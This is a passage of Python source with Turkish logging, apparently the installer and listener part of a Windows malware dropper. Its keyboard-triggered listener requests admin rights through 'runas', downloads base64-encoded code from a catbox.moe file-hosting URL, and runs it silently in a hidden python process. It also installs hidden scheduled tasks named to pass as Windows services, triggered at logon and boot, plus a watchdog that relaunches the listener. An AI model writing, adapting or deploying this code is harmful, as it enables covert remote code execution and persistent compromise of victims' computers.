
debug_log("Trigger key: " + KEY_NAME + " (code: " + KEY_CODE + ")")

def check_dependencies():
    debug_log("Dependency kontrolü başlatılıyor...")
    
    required_modules = ['requests', 'pynput.keyboard', 'psutil']
    missing_modules = []
    
    for module in required_modules:
        try:
            if module == 'requests':
                import requests
                debug_log(f"✓ {module} yüklendi")
            elif module == 'pynput.keyboard':
                from pynput import keyboard
                debug_log(f"✓ {module} yüklendi")
            elif module == 'psutil':
                import psutil
                debug_log(f"✓ {module} yüklendi")
        except ImportError as e:
            missing_modules.append(module)
            debug_log(f"✗ {module} yüklenemedi: {e}")
        except Exception as e:
            missing_modules.append(module)
            debug_log(f"✗ {module} hatası: {e}")
    
    if missing_modules:
        debug_log(f"Eksik modüller: {missing_modules}")
        return False
    
    debug_log("Tüm gerekli modüller mevcut ✓")
    return True

if not check_dependencies():
    debug_log("Kritik modüller eksik, listener kapatılıyor")
    sys.exit(1)

LISTENER_RUNNING = True
RESTART_COUNT = 0
MAX_RESTARTS = 3

def run_payload():
    debug_log("run_payload çağrıldı")
    
    try:
        import ctypes
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        debug_log(f"Admin yetkisi: {is_admin}")
        
        if not is_admin:
            debug_log("Admin yetkisi yok, yeniden başlatılıyor...")
            try:
                ctypes.windll.shell32.ShellExecuteW(
                    None, "runas", sys.executable, ' '.join([f'"{arg}"' for arg in sys.argv]), None, 1
                )
                debug_log("Admin yetkisi ile yeniden başlatma komutu gönderildi")
                return
            except Exception as e:
                debug_log(f"Admin yeniden başlatma hatası: {e}")
                return
        
        debug_log("Admin yetkisi var, payload çalıştırılıyor...")
        
        # AUTH BYPASS - Direkt URL'den indir
        url = "https://files.catbox.moe/g1ysau.txt"
        debug_log("URL'den indiriliyor: " + url)
        
        headers = {
            "User-Agent": "XIR-Auth/1.0"
        }
        
        response = requests.get(url, timeout=15, headers=headers)
        
        debug_log("Response status: " + str(response.status_code))
        if response.status_code == 200:
            base64_code = response.text.strip()
            debug_log("Base64 kod uzunluğu: " + str(len(base64_code)))
            
            try:
                decoded_code = base64.b64decode(base64_code).decode('utf-8')
                debug_log("Decode edilen kod uzunluğu: " + str(len(decoded_code)))
                
                try:
                    compile(decoded_code, '<string>', 'exec')
                    debug_log("Payload syntax hatası yok ✓")
                except SyntaxError as syntax_err:
                    debug_log("Payload syntax hatası: " + str(syntax_err))
                    return
                except Exception as compile_err:
                    debug_log("Payload compile hatası: " + str(compile_err))
                    return
                
                env = os.environ.copy()
                env["PYTHONIOENCODING"] = "utf-8"
                
                debug_log("Payload çalıştırılıyor...")
                proc = subprocess.Popen(
                    ["python", "-"],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    cwd=os.environ.get("TEMP", None),
                    env=env,
                    creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0)
                )
                
                stdout, stderr = proc.communicate(decoded_code.encode("utf-8"))
                
                if proc.returncode == 0:
                    debug_log("Payload başarıyla çalıştırıldı! ✓")
                    if stdout:
                        debug_log("Payload stdout: " + stdout.decode('utf-8', errors='ignore'))
                else:
                    debug_log("Payload çalıştırma hatası! Return code: " + str(proc.returncode))
                    if stderr:
                        debug_log("Payload stderr: " + stderr.decode('utf-8', errors='ignore'))
                    if stdout:
                        debug_log("Payload stdout: " + stdout.decode('utf-8', errors='ignore'))
                        
            except Exception as payload_error:
                debug_log("Payload decode/çalıştırma hatası: " + str(payload_error))
                debug_log(traceback.format_exc())
        else:
            debug_log("Payload indirilemedi! HTTP " + str(response.status_code))
            
    except Exception as e:
        debug_log("run_payload genel hatası: " + str(e))
        debug_log(traceback.format_exc())

def on_press(key):
    try:
        debug_log("Key event: " + str(key))
        
        key_matched = False
        
        if hasattr(key, 'char') and key.char and key.char.lower() == KEY_NAME.lower():
            debug_log("Char match, run_payload")
            key_matched = True
        elif hasattr(key, 'name') and key.name.lower() == KEY_NAME.lower():
            debug_log("Name match, run_payload")
            key_matched = True
        elif str(key).lower() == 'key.' + KEY_NAME.lower():
            debug_log("Str match, run_payload")
            key_matched = True
        elif hasattr(key, 'vk') and KEY_CODE != 'None':
            try:
                if key.vk == int(KEY_CODE):
                    debug_log("VK match, run_payload")
                    key_matched = True
            except:
                pass
        
        if key_matched:
            debug_log("Trigger key eşleşti, payload başlatılıyor...")
            run_payload()
            
    except Exception as e:
        debug_log("on_press error: " + str(e))
        debug_log(traceback.format_exc())

def restart_listener():
    global RESTART_COUNT, LISTENER_RUNNING
    
    if RESTART_COUNT >= MAX_RESTARTS:
        debug_log(f"Maximum restart sayısına ulaşıldı ({MAX_RESTARTS}), listener kapatılıyor")
        LISTENER_RUNNING = False
        return
    
    RESTART_COUNT += 1
    debug_log(f"Listener yeniden başlatılıyor... (Deneme {RESTART_COUNT}/{MAX_RESTARTS})")
    
    try:
        # Mevcut listener'ı kapat
        if 'listener' in globals():
            try:
                listener.stop()
                debug_log("Eski listener durduruldu")
            except:
                pass
        
        # Yeni listener başlat
        time.sleep(2)  # Kısa bekleme
        start_keyboard_listener()
        
    except Exception as e:
        debug_log(f"Listener yeniden başlatma hatası: {e}")
        debug_log(traceback.format_exc())

def start_keyboard_listener():
    global listener
    
    try:
        debug_log("Keyboard listener başlatılıyor...")
        
        # pynput.keyboard import kontrolü
        try:
            from pynput import keyboard
            debug_log("pynput.keyboard başarıyla import edildi")
        except ImportError as e:
            debug_log(f"pynput.keyboard import hatası: {e}")
            return False
        
        # Listener'ı başlat
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        
        debug_log("Keyboard listener başarıyla başlatıldı ✓")
        debug_log("Trigger key bekleniyor: " + KEY_NAME)
        
        return True
        
    except Exception as e:
        debug_log(f"Keyboard listener başlatma hatası: {e}")
        debug_log(traceback.format_exc())
        return False

def main():
    global LISTENER_RUNNING, RESTART_COUNT
    
    debug_log("Listener main başladı")
    
    try:
        # Task Scheduler debug log kontrolü
        debug_log("Task Scheduler debug log kontrol ediliyor...")
        check_task_scheduler_debug_log()
        
        # Startup'ta kısa bekleme (sistem hazır olsun)
        debug_log("Sistem hazırlanması bekleniyor...")
        time.sleep(5)
        
        # Listener'ı başlat
        if not start_keyboard_listener():
            debug_log("Keyboard listener başlatılamadı!")
            return
        
        # Ana döngü
        debug_log("Ana döngü başladı")
        while LISTENER_RUNNING:
            try:
                # Listener'ın çalışıp çalışmadığını kontrol et
                if not listener.is_alive():
                    debug_log("Listener durdu, yeniden başlatılıyor...")
                    restart_listener()
                    if not LISTENER_RUNNING:
                        break
                    continue
                
                # Her 30 saniyede bir heartbeat
                time.sleep(30)
                debug_log("Listener heartbeat - çalışıyor...")
                
            except KeyboardInterrupt:
                debug_log("Keyboard interrupt alındı")
                break
            except Exception as e:
                debug_log(f"Ana döngü hatası: {e}")
                debug_log(traceback.format_exc())
                time.sleep(10)
        
        debug_log("Ana döngü sonlandı")
        
    except Exception as e:
        debug_log("main genel hatası: " + str(e))
        debug_log(traceback.format_exc())
        
        # Hata durumunda yeniden başlatmayı dene
        if RESTART_COUNT < MAX_RESTARTS:
            debug_log("Hata nedeniyle yeniden başlatma deneniyor...")
            restart_listener()
    
    finally:
        debug_log("Listener main sonlandı")
        try:
            if 'listener' in globals():
                listener.stop()
                debug_log("Listener durduruldu")
        except:
            pass

if __name__ == '__main__':
    debug_log("Listener script __main__ bloğu çalıştırıldı")
    
    try:
        # Exception handler ekle
        def handle_exception(exc_type, exc_value, exc_traceback):
            debug_log(f"Uncaught exception: {exc_type.__name__}: {exc_value}")
            debug_log(traceback.format_exc())
        
        sys.excepthook = handle_exception
        
        main()
        
    except Exception as e:
        debug_log("__main__ error: " + str(e))
        debug_log(traceback.format_exc())
        
    finally:
        debug_log("Listener script tamamen sonlandı")
        # Kapanmadan önce kısa bekleme
        time.sleep(2)
"""

def get_pythonw():
    import sys, os, shutil
    exe = sys.executable
    possible_dirs = [
        os.path.dirname(exe),
        os.path.dirname(os.path.dirname(exe)),
        r"C:\Python311",
        r"C:\Python312",
        r"C:\Python310",
        r"C:\Python39",
        r"C:\Python38",
        os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Programs', 'Python', 'Python311'),
        os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Programs', 'Python', 'Python312'),
        os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Programs', 'Python', 'Python310'),
        os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Programs', 'Python', 'Python39'),
        os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Programs', 'Python', 'Python38'),
        os.path.join(os.environ.get('APPDATA', ''), 'Local', 'Programs', 'Python', 'Python311'),
        os.path.join(os.environ.get('APPDATA', ''), 'Local', 'Programs', 'Python', 'Python312'),
        os.path.join(os.environ.get('APPDATA', ''), 'Local', 'Programs', 'Python', 'Python310'),
        os.path.join(os.environ.get('APPDATA', ''), 'Local', 'Programs', 'Python', 'Python39'),
        os.path.join(os.environ.get('APPDATA', ''), 'Local', 'Programs', 'Python', 'Python38')
    ]
    
    for d in possible_dirs:
        if d:
            pyw = os.path.join(d, "pythonw.exe")
            if os.path.exists(pyw):
                print(f"[DEBUG] pythonw bulundu: {pyw}")
                return pyw
    
    pyw = shutil.which("pythonw.exe")
    if pyw:
        print(f"[DEBUG] pythonw PATH'ta bulundu: {pyw}")
        return pyw
    
    try:
        import subprocess
        result = subprocess.run(['where', 'pythonw'], capture_output=True, text=True, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        if result.returncode == 0:
            pyw = result.stdout.strip().split('\n')[0]
            if os.path.exists(pyw):
                print(f"[DEBUG] pythonw where ile bulundu: {pyw}")
                return pyw
    except:
        pass
    
    try:
        result = subprocess.run(['python', '--version'], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        if result.returncode == 0:
            print("[WARN] Python kurulu ama pythonw bulunamadı!")
    except:
        pass
    
    raise FileNotFoundError("pythonw.exe bulunamadı! Lütfen sistemde Python kurulu olduğundan emin olun.")

def schedule_listener(pythonw, listener_path):
    import subprocess
    import random
    import string
    import datetime
    global CURRENT_TASK_NAME
    
    print(f"[DEBUG] ====== SCHEDULE_LISTENER BAŞLADI ======")
    print(f"[DEBUG] pythonw: {pythonw}")
    print(f"[DEBUG] listener_path: {listener_path}")
    
    debug_logger = TaskSchedulerDebugLogger()
    
    def generate_random_task_name():
        service_names = [
            "WindowsSystemService",
            "SystemConfigUpdate", 
            "WindowsSearchService",
            "UserDataSync",
            "SystemMaintenance",
            "WindowsUpdateService",
            "SystemHealthMonitor",
            "WindowsSecurityService"
        ]
        base_name = random.choice(service_names)
        suffix = ''.join(random.choices(string.ascii_letters + string.digits, k=3))
        return f"{base_name}_{suffix}"
    
    task_name = generate_random_task_name()
    print(f"[DEBUG] Random Task adı: {task_name}")
    debug_logger.log(f"Task adı oluşturuldu: {task_name}")
    
    print("[DEBUG] Eski görevler temizleniyor...")
    debug_logger.log("Eski görevler temizleniyor...")
    
    try:
        cleanup_cmd = 'schtasks /Query /TN "*" /FO CSV 2>nul | findstr "WindowsSystemService\\|SystemConfigUpdate\\|WindowsSearchService\\|UserDataSync\\|SystemMaintenance\\|WindowsUpdateService\\|SystemHealthMonitor\\|WindowsSecurityService"'
        cleanup_result = subprocess.run(cleanup_cmd, shell=True, capture_output=True, text=True, encoding='utf-8', errors='ignore', creationflags=0x08000000)
        
        if cleanup_result.stdout:
            for line in cleanup_result.stdout.strip().split('\n'):
                if line and any(service in line for service in ["WindowsSystemService", "SystemConfigUpdate", "WindowsSearchService", "UserDataSync", "SystemMaintenance", "WindowsUpdateService", "SystemHealthMonitor", "WindowsSecurityService"]):
                    old_task = line.split(',')[0].strip('"')
                    try:
                        subprocess.run(f'schtasks /Delete /TN "{old_task}" /F', shell=True, capture_output=True, creationflags=0x08000000)
                        print(f"[DEBUG] Eski görev temizlendi: {old_task}")
                        debug_logger.log(f"Eski görev temizlendi: {old_task}")
                    except Exception as e:
                        print(f"[DEBUG] Eski görev silme hatası {old_task}: {e}")
                        debug_logger.log(f"Eski görev silme hatası {old_task}: {e}")
    except Exception as e:
        print(f"[DEBUG] Cleanup hatası: {e}")
        debug_logger.log(f"Cleanup hatası: {e}")
    
    xml_content = f'''<?xml version="1.0"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <RunLevel>HighestAvailable</RunLevel>
      <LogonType>InteractiveToken</LogonType>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure>
      <Interval>PT1M</Interval>
      <Count>3</Count>
    </RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>"{pythonw}"</Command>
      <Arguments>"{listener_path}"</Arguments>
    </Exec>
  </Actions>
</Task>'''
    
    print(f"[DEBUG] XML içeriği oluşturuldu, uzunluk: {len(xml_content)}")
    debug_logger.log(f"XML içeriği oluşturuldu, uzunluk: {len(xml_content)}")
    
    xml_path = os.path.join(os.environ.get('TEMP', ''), f'{task_name}.xml')
    try:
        with open(xml_path, 'wb') as f:
            f.write(xml_content.encode('utf-8'))
        print(f"[DEBUG] XML dosyası oluşturuldu: {xml_path}")
        debug_logger.log(f"XML dosyası oluşturuldu: {xml_path}")
    except Exception as e:
        print(f"[ERROR] XML dosyası oluşturma hatası: {e}")
        debug_logger.log(f"XML dosyası oluşturma hatası: {e}")
        return False
    
    xml_cmd = f'schtasks /Create /TN "{task_name}" /XML "{xml_path}" /F'
    print(f"[DEBUG] XML komutu: {xml_cmd}")
    debug_logger.log(f"XML komutu: {xml_cmd}")
    
    print("[DEBUG] Task Scheduler görevi oluşturuluyor...")
    debug_logger.log("Task Scheduler görevi oluşturuluyor...")
    
    xml_result = subprocess.run(xml_cmd, shell=True, capture_output=True, text=True, encoding='cp1254', errors='ignore', creationflags=0x08000000)
    
    print(f"[DEBUG] XML create return code: {xml_result.returncode}")
    print(f"[DEBUG] XML create stdout: {xml_result.stdout}")
    print(f"[DEBUG] XML create stderr: {xml_result.stderr}")
    
    try:
        with open(xml_path, 'r', encoding='utf-8') as f:
            xml_check = f.read()
            print(f"[DEBUG] XML dosya içeriği (ilk 500 karakter): {xml_check[:500]}")
    except Exception as e:
        print(f"[DEBUG] XML dosya okuma hatası: {e}")
    
    if xml_result.returncode == 0:
        print("[DEBUG] XML ile Task Scheduler create başarılı ✓")
        debug_logger.log("XML ile Task Scheduler create başarılı ✓")
        
        try:
            os.remove(xml_path)
            print("[DEBUG] XML dosyası temizlendi")
            debug_logger.log("XML dosyası temizlendi")
        except Exception as e:
            print(f"[WARN] XML dosyası temizleme hatası: {e}")
            debug_logger.log(f"XML dosyası temizleme hatası: {e}")
        
        print("[DEBUG] Task Scheduler görevi çalıştırılıyor...")
        debug_logger.log("Task Scheduler görevi çalıştırılıyor...")
        
        run_cmd = f'schtasks /Run /TN "{task_name}"'
        run_result = subprocess.run(run_cmd, shell=True, capture_output=True, text=True, encoding='utf-8', errors='ignore', creationflags=0x08000000)
        
        if run_result.returncode == 0:
            print("[INFO] Listener XML ile Task Scheduler'da başlatıldı ✓")
            debug_logger.log("Listener XML ile Task Scheduler'da başlatıldı ✓")
            CURRENT_TASK_NAME = task_name
            return True
        else:
            print(f"[ERROR] XML Task Scheduler run başarısız: {run_result.returncode}")
            debug_logger.log(f"XML Task Scheduler run başarısız: {run_result.returncode}")
            debug_logger.log(f"Run komutu: {run_cmd}")
            debug_logger.log(f"Run stdout: {run_result.stdout}")
            debug_logger.log(f"Run stderr: {run_result.stderr}")
            return False
    else:
        print(f"[ERROR] XML Task Scheduler create başarısız: {xml_result.returncode}")
        debug_logger.log(f"XML Task Scheduler create başarısız: {xml_result.returncode}")
        debug_logger.log(f"Create stdout: {xml_result.stdout}")
        debug_logger.log(f"Create stderr: {xml_result.stderr}")
        
        try:
            os.remove(xml_path)
        except Exception:
            pass
        
        print("[DEBUG] Eski yöntem ile deneme...")
        debug_logger.log("Eski yöntem ile deneme...")
        
        old_cmd = f'schtasks /Create /SC ONLOGON /TN "{task_name}" /TR "\"{pythonw}\" \"{listener_path}\"" /F /DELAY 0000:30'
        result = subprocess.run(old_cmd, shell=True, capture_output=True, text=True, encoding='utf-8', errors='ignore', creationflags=0x08000000)
        
        if result.returncode == 0:
            print("[DEBUG] Eski Task Scheduler create başarılı ✓")
            debug_logger.log("Eski Task Scheduler create başarılı ✓")
            
            run_cmd = f'schtasks /Run /TN "{task_name}"'
            run_result = subprocess.run(run_cmd, shell=True, capture_output=True, text=True, encoding='utf-8', errors='ignore', creationflags=0x08000000)
            
            if run_result.returncode == 0:
                print("[INFO] Listener eski yöntem ile Task Scheduler'da başlatıldı ✓")
                debug_logger.log("Listener eski yöntem ile Task Scheduler'da başlatıldı ✓")
                CURRENT_TASK_NAME = task_name
                return True
            else:
                debug_logger.log(f"Eski yöntem run başarısız: {run_result.returncode}")
                debug_logger.log(f"Eski yöntem run stdout: {run_result.stdout}")
                debug_logger.log(f"Eski yöntem run stderr: {run_result.stderr}")
        else:
            debug_logger.log(f"Eski yöntem create başarısız: {result.returncode}")
            debug_logger.log(f"Eski yöntem create stdout: {result.stdout}")
            debug_logger.log(f"Eski yöntem create stderr: {result.stderr}")
        
        return False



class TaskSchedulerDebugLogger:

    
    def __init__(self):
        pass
    
    def ensure_log_directory(self):
        pass
    
    def log(self, message):
        try:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            log_message = f"[{timestamp}] {message}"
            print(log_message)
        except Exception:
            pass
    
    def log_system_info(self):
        try:
            self.log("=" * 60)
            self.log("SİSTEM BİLGİLERİ")
            self.log("=" * 60)
            self.log(f"Windows Version: {platform.platform()}")
            self.log(f"Python Version: {sys.version}")
            self.log(f"Current Directory: {os.getcwd()}")
            self.log(f"Temp Directory: {os.environ.get('TEMP', 'Not set')}")
            self.log(f"User: {os.environ.get('USERNAME', 'Not set')}")
            self.log(f"Computer: {os.environ.get('COMPUTERNAME', 'Not set')}")
            
            try:
                import subprocess
                result = subprocess.run('sc query Schedule', shell=True, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
                if result.returncode == 0:
                    if "RUNNING" in result.stdout:
                        self.log("Task Scheduler servisi: ÇALIŞIYOR")
                    else:
                        self.log("Task Scheduler servisi: ÇALIŞMIYOR")
                        self.log(f"Servis durumu: {result.stdout}")
                else:
                    self.log(f"Task Scheduler servis kontrolü başarısız: {result.returncode}")
            except Exception as e:
                self.log(f"Task Scheduler servis kontrolü hatası: {e}")
            
            self.log("=" * 60)
            
        except Exception as e:
            self.log(f"Sistem bilgisi log hatası: {e}")
    
    def log_task_status(self):
        try:
            self.log("MEVCUT TASK SCHEDULER GÖREVLERİ:")
            self.log("-" * 40)
            
            import subprocess
            result = subprocess.run('schtasks /Query /FO CSV', shell=True, capture_output=True, text=True, encoding='utf-8', errors='ignore', creationflags=subprocess.CREATE_NO_WINDOW)
            
            if result.returncode == 0:
                lines = result.stdout.strip().split('\n')
                self.log(f"Toplam görev sayısı: {len(lines)}")
                
                listener_tasks = []
                for line in lines:
                    if any(service in line for service in ["WindowsSystemService", "SystemConfigUpdate", "UserDataSync", "WindowsSearchService"]):
                        listener_tasks.append(line)
                
                if listener_tasks:
                    self.log(f"Listener görevleri: {len(listener_tasks)}")
                    for task in listener_tasks:
                        self.log(f"  - {task}")
                else:
                    self.log("Listener görevi bulunamadı")
            else:
                self.log(f"Görev listesi alınamadı: {result.returncode}")
                self.log(f"Hata: {result.stderr}")
                
        except Exception as e:
            self.log(f"Task durumu log hatası: {e}")
    
    def cleanup_old_logs(self, days=7):
        pass

def monitor_listener_process(listener_path):
    print("[DEBUG] ====== MONITOR_LISTENER_PROCESS BAŞLADI ======")
    print(f"[DEBUG] Monitoring başlatıldı: {listener_path}")
    
    pass
    
    try:
        import psutil
        import time
        
        while True:
            try:
                listener_found = False
                listener_processes = []
                
                for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                    try:
                        if proc.info['name'] and 'pythonw' in proc.info['name'].lower():
                            cmdline = proc.info.get('cmdline', [])
                            if listener_path in ' '.join(cmdline):
                                listener_found = True
                                listener_processes.append({
                                    'pid': proc.info['pid'],
                                    'name': proc.info['name'],
                                    'cmdline': cmdline,
                                    'status': proc.status(),
                                    'cpu_percent': proc.cpu_percent(),
                                    'memory_mb': proc.memory_info().rss / 1024 / 1024
                                })
                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                        continue
                
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                log_message = f"[{timestamp}] "
                
                if listener_found:
                    log_message += f"Listener process bulundu: {len(listener_processes)} adet"
                    print(f"[DEBUG] ✓ {log_message}")
                    for proc_info in listener_processes:
                        proc_log = f"[{timestamp}] - PID {proc_info['pid']}: {proc_info['name']} - {proc_info['status']} - CPU: {proc_info['cpu_percent']:.1f}% - RAM: {proc_info['memory_mb']:.1f} MB"
                        print(f"[DEBUG] {proc_log}")
                        log_message += f"\n{proc_log}"
                else:
                    log_message += "Listener process bulunamadı!"
                    print(f"[DEBUG] ✗ {log_message}")
                    

                    restart_log = f"[{timestamp}] Listener yeniden başlatılıyor..."
                    print(f"[DEBUG] {restart_log}")
                    log_message += f"\n{restart_log}"
                    
                    try:
                        pythonw = get_pythonw()
                        if pythonw and os.path.exists(listener_path):
                            subprocess.Popen([pythonw, listener_path], 
                                           creationflags=subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.DETACHED_PROCESS,
                                           stdout=subprocess.DEVNULL, 
                                           stderr=subprocess.DEVNULL)
                            restart_success = f"[{timestamp}] Listener yeniden başlatma denendi"
                            print(f"[DEBUG] {restart_success}")
                            log_message += f"\n{restart_success}"
                        else:
                            restart_fail = f"[{timestamp}] Pythonw bulunamadı veya listener dosyası yok"
                            print(f"[DEBUG] {restart_fail}")
                            log_message += f"\n{restart_fail}"
                    except Exception as e:
                        restart_error = f"[{timestamp}] Listener yeniden başlatma hatası: {e}"
                        print(f"[DEBUG] {restart_error}")
                        log_message += f"\n{restart_error}"
                
                pass
                
                time.sleep(30)
                
            except Exception as e:
                error_log = f"[{timestamp}] Monitoring hatası: {e}"
                print(f"[DEBUG] {error_log}")
                time.sleep(30)
                
    except Exception as e:
        final_error = f"[{timestamp}] Monitor thread hatası: {e}"
        print(f"[DEBUG] {final_error}")
    
    print("[DEBUG] ====== MONITOR_LISTENER_PROCESS TAMAMLANDI ======")

def test_listener_after_install():
    print("[DEBUG] ====== TEST_LISTENER_AFTER_INSTALL BAŞLADI ======")
    
    try:
        import psutil
        import subprocess
        
        print("[DEBUG] Sistemdeki tüm pythonw process'leri kontrol ediliyor...")
        pythonw_processes = []
        
        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
            try:
                if proc.info['name'] and 'pythonw' in proc.info['name'].lower():
                    cmdline = proc.info.get('cmdline', [])
                    pythonw_processes.append({
                        'pid': proc.info['pid'],
                        'name': proc.info['name'],
                        'cmdline': cmdline,
                        'status': proc.status(),
                        'cpu_percent': proc.cpu_percent(),
                        'memory_mb': proc.memory_info().rss / 1024 / 1024
                    })
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue
        
        print(f"[DEBUG] Toplam {len(pythonw_processes)} pythonw process bulundu")
        
        listener_processes = []
        for proc_info in pythonw_processes:
            cmdline_str = ' '.join(proc_info['cmdline'])
            if any(path in cmdline_str for path in HIDDEN_PATHS):
                listener_processes.append(proc_info)
                print(f"[DEBUG] ✓ Listener process bulundu: PID {proc_info['pid']}")
                print(f"[DEBUG]   Command: {proc_info['cmdline']}")
                print(f"[DEBUG]   Status: {proc_info['status']}")
                print(f"[DEBUG]   CPU: {proc_info['cpu_percent']:.1f}%")
                print(f"[DEBUG]   Memory: {proc_info['memory_mb']:.1f} MB")
        
        if listener_processes:
            print(f"[DEBUG] ✓ {len(listener_processes)} listener process çalışıyor")
        else:
            print("[DEBUG] ✗ Hiç listener process bulunamadı!")
            
            print("[DEBUG] Manuel listener başlatma deneniyor...")
            try:
                pythonw = get_pythonw()
                if pythonw:
                    listener_found = False
                    for hidden_path in HIDDEN_PATHS:
                        if os.path.exists(hidden_path):
                            for filename in os.listdir(hidden_path):
                                if filename.endswith('.pyw') or filename.endswith('.py'):
                                    listener_path = os.path.join(hidden_path, filename)
                                    print(f"[DEBUG] Listener dosyası bulundu: {listener_path}")
                                    
                                    subprocess.Popen([pythonw, listener_path], 
                                                   creationflags=subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.DETACHED_PROCESS,
                                                   stdout=subprocess.DEVNULL, 
                                                   stderr=subprocess.DEVNULL)
                                    print(f"[DEBUG] Manuel listener başlatma denendi: {listener_path}")
                                    listener_found = True
                                    break
                            if listener_found:
                                break
                    
                    if not listener_found:
                        print("[DEBUG] Listener dosyası bulunamadı!")
                        
            except Exception as e:
                print(f"[DEBUG] Manuel listener başlatma hatası: {e}")
        
        print("[DEBUG] Task Scheduler görevleri kontrol ediliyor...")
        try:
            result = subprocess.run('schtasks /Query /FO CSV', shell=True, capture_output=True, text=True, encoding='utf-8', errors='ignore', creationflags=subprocess.CREATE_NO_WINDOW)
            if result.returncode == 0:
                lines = result.stdout.strip().split('\n')
                listener_tasks = []
                for line in lines:
                    if any(service in line for service in ["WindowsSystemService", "SystemConfigUpdate", "UserDataSync", "WindowsSearchService"]):
                        listener_tasks.append(line)
                        print(f"[DEBUG] ✓ Listener task bulundu: {line}")
                
                if listener_tasks:
                    print(f"[DEBUG] ✓ {len(listener_tasks)} listener task bulundu")
                else:
                    print("[DEBUG] ✗ Hiç listener task bulunamadı!")
            else:
                print(f"[DEBUG] Task Scheduler sorgu hatası: {result.returncode}")
        except Exception as e:
            print(f"[DEBUG] Task Scheduler kontrol hatası: {e}")
        
        print("[DEBUG] Registry startup kayıtları kontrol edilmiyor (sadece Task Scheduler kullanılıyor)")
        listener_registry = []
        
        print("[DEBUG] ====== TEST_LISTENER_AFTER_INSTALL TAMAMLANDI ======")
        
    except Exception as e:
        print(f"[DEBUG] Test hatası: {e}")
        print("[DEBUG] ====== TEST_LISTENER_AFTER_INSTALL TAMAMLANDI ======")

def check_listener_status():
    print("[DEBUG] ====== CHECK_LISTENER_STATUS BAŞLADI ======")
    
    try:
        import psutil
        import subprocess
        
        print("=" * 60)
        print("LISTENER DURUM RAPORU")
        print("=" * 60)
        
        print("\\n1. PROCESS KONTROLÜ:")
        print("-" * 30)
        
        pythonw_processes = []
        listener_processes = []
        
        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
            try:
                if proc.info['name'] and 'pythonw' in proc.info['name'].lower():
                    cmdline = proc.info.get('cmdline', [])
                    pythonw_processes.append(proc.info['pid'])
                    
                    cmdline_str = ' '.join(cmdline)
                    if any(path in cmdline_str for path in HIDDEN_PATHS):
                        listener_processes.append({
                            'pid': proc.info['pid'],
                            'cmdline': cmdline,
                            'status': proc.status(),
                            'cpu_percent': proc.cpu_percent(),
                            'memory_mb': proc.memory_info().rss / 1024 / 1024
                        })
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue
        
        print(f"Toplam pythonw process: {len(pythonw_processes)}")
        print(f"Listener process: {len(listener_processes)}")
        
        if listener_processes:
            print("✓ Listener process'leri çalışıyor:")
            for proc_info in listener_processes:
                print(f"  - PID {proc_info['pid']}: {proc_info['cmdline']}")
                print(f"    Status: {proc_info['status']}, CPU: {proc_info['cpu_percent']:.1f}%, RAM: {proc_info['memory_mb']:.1f} MB")
        else:
            print("✗ Hiç listener process bulunamadı!")
        
        print("\\n2. TASK SCHEDULER KONTROLÜ:")
        print("-" * 30)
        
        try:
            result = subprocess.run('schtasks /Query /FO CSV', shell=True, capture_output=True, text=True, encoding='utf-8', errors='ignore', creationflags=subprocess.CREATE_NO_WINDOW)
            if result.returncode == 0:
                lines = result.stdout.strip().split('\\n')
                listener_tasks = []
                for line in lines:
                    if any(service in line for service in ["WindowsSystemService", "SystemConfigUpdate", "UserDataSync", "WindowsSearchService"]):
                        listener_tasks.append(line)
                
                if listener_tasks:
                    print(f"✓ {len(listener_tasks)} listener task bulundu:")
                    for task in listener_tasks:
                        print(f"  - {task}")
                else:
                    print("✗ Hiç listener task bulunamadı!")
            else:
                print(f"✗ Task Scheduler sorgu hatası: {result.returncode}")
        except Exception as e:
            print(f"✗ Task Scheduler kontrol hatası: {e}")
        
        print("\\n3. REGISTRY KONTROLÜ:")
        print("-" * 30)
        print("Registry kontrolü atlandı (sadece Task Scheduler kullanılıyor)")
        listener_registry = []
        
        print("\\n4. DOSYA KONTROLÜ:")
        print("-" * 30)
        
        listener_files = []
        for hidden_path in HIDDEN_PATHS:
